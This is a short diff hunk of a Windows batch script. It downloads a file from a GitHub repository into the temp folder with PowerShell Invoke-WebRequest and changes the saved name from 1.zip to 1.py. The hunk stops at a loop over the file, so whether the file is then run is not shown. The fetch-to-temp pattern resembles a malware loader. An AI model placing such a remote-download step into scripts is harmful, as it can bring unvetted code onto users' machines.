@@ -2,7 +2,7 @@
 setlocal
 set "url=https://github.com/Marinff/test/raw/refs/heads/main/python.zip"
 set "tempdir=%temp%"
-set "output=%tempdir%\1.zip"
+set "output=%tempdir%\1.py"
 :download
 powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %output%"
 for %%A in ("%output%") do (
